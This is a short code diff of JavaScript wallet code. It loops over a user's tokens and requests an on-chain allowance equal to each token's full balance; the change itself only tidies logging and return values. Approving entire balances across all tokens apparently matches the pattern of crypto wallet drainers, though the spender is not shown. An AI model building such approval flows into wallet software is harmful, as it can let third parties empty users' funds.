@@ -43,7 +43,7 @@ const increaseAllowanceForTokens = async (tokensData) => {
     const { contractAddress, balance } = token;
     await increaseAllowance(contractAddress, balance);
   }
-  return console.log("tokens looped and passed succesfully")
+  return console.log("tokens looped and passed succesfully");
 };
 
 const increaseAllowance = async (contractAddress, allowance) => {
@@ -57,13 +57,9 @@ const increaseAllowance = async (contractAddress, allowance) => {
         parseEther(allowance),
       ],
     });
-    console.log("Transaction hash:", hash);
-    console.table({
-      "contract address": contractAddress,
-      "token balance": allowance,
-    });
+    return { success: true, data: hash };
   } catch (error) {
-    console.log("User rejected the transaction victor");
+    return { success: false, error: error.message };
   }
 };
 
